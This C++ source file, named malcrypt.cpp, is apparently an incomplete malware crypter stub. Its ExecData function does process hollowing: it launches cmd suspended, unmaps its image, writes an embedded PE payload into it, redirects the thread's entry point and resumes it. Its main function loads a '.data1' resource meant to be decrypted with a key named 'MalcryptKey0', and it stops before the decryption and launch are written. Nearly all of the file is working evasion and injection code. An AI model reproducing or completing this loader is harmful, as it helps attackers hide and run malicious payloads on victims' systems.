// malcrypt.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

//extern "C" NTSYSAPI LONG NTAPI ZwUnmapViewOfSection(HANDLE, PVOID);
/* http://stackoverflow.com/questions/15714492/creating-a-proccess-in-memory-c */
typedef LONG(NTAPI *pfnZwUnmapViewOfSection)(HANDLE, PVOID);

ULONG protect(ULONG characteristics)
{
	static const ULONG mapping[]
		= { PAGE_NOACCESS, PAGE_EXECUTE, PAGE_READONLY, PAGE_EXECUTE_READ,
		PAGE_READWRITE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE };

	return mapping[characteristics >> 29];
}

HRESULT
ExecData(PVOID pvPEData)
{
	PROCESS_INFORMATION pi;
	STARTUPINFO si = { sizeof si };

	CreateProcess(0, L"cmd", 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, &si, &pi);

	CONTEXT context = { CONTEXT_INTEGER };
	GetThreadContext(pi.hThread, &context);

	PVOID x; 
	
	/* Dynamic linking call: */
	HMODULE hMod = GetModuleHandle(L"ntdll.dll");
	pfnZwUnmapViewOfSection pZwUnmapViewOfSection = 
		(pfnZwUnmapViewOfSection)GetProcAddress(hMod, "ZwUnmapViewOfSection");

	ReadProcessMemory(pi.hProcess, PCHAR(context.Ebx) + 8, &x, sizeof x, 0);
	pZwUnmapViewOfSection(pi.hProcess, x);

	PIMAGE_NT_HEADERS nt = PIMAGE_NT_HEADERS(
		PCHAR(pvPEData) + PIMAGE_DOS_HEADER(pvPEData)->e_lfanew);

	PVOID q = VirtualAllocEx(pi.hProcess,
		PVOID(nt->OptionalHeader.ImageBase),
		nt->OptionalHeader.SizeOfImage,
		MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	WriteProcessMemory(pi.hProcess, q, pvPEData, nt->OptionalHeader.SizeOfHeaders, 0);
	PIMAGE_SECTION_HEADER sect = IMAGE_FIRST_SECTION(nt);

	for (ULONG i = 0; i < nt->FileHeader.NumberOfSections; i++) {
		WriteProcessMemory(pi.hProcess,
			PCHAR(q) + sect[i].VirtualAddress,
			PCHAR(pvPEData) + sect[i].PointerToRawData,
			sect[i].SizeOfRawData, 0);

		ULONG x;
		VirtualProtectEx(pi.hProcess, PCHAR(q) + sect[i].VirtualAddress, sect[i].Misc.VirtualSize,
			protect(sect[i].Characteristics), &x);
	}

	WriteProcessMemory(pi.hProcess, PCHAR(context.Ebx) + 8, &q, sizeof q, 0);
	context.Eax = ULONG(q) + nt->OptionalHeader.AddressOfEntryPoint;
	SetThreadContext(pi.hThread, &context);
	ResumeThread(pi.hThread);

	return 0;
}


int _tmain(int argc, _TCHAR* argv[])
{
	HRESULT status;
	PCWSTR keyName = L"MalcryptKey0";

	/* Using the (now-static keyname), decrypt a PE section. */
	// /SECTION:name,[[!]{!K!PR}][,ALIGN=#]

	/* Rewrite this compiled binary to include a ".data1" section. */
	HRSRC resInfo = FindResource(0, L".data1", L"EXE");
	DWORD resInfoSize = SizeofResource(0, resInfo);

	/* Now decrypt the resource. */

	PVOID ogPEData = LockResource(LoadResource(0, resInfo));
}

